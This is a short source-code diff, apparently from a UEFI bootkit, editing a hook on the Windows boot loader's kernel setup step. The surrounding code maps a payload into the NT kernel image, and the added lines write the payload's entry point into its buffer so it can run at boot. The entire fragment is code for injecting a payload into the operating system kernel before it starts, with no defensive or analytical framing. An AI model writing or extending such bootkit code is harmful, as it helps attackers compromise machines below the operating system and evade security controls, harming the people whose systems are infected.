@@ -117,6 +117,11 @@ HkOslFwpSetupKernelPhase1(
 				Status = MpMapPayload((UINT8 *)NtImageBase, Payload, PayloadBuf, &EntryPoint);
 				if(EFI_ERROR(Status))
 					SetGlobalPatchStatus(Status, L"Cannot map payload", (VOID *)MpMapPayload);
+				
+				// forgot about it
+				*(UINT64 *)(PayloadBuf) = NULL;
+				*(UINT64 *)(PayloadBuf + 0x8) = NULL;
+				*(UINT64 *)(PayloadBuf + 0x10) = (UINT64)EntryPoint;
 			}
 		} else {
 			SetGlobalPatchStatus(EFI_COMPROMISED_DATA, L"Corrupted kernel", (VOID *)HkOslFwpSetupKernelPhase1);
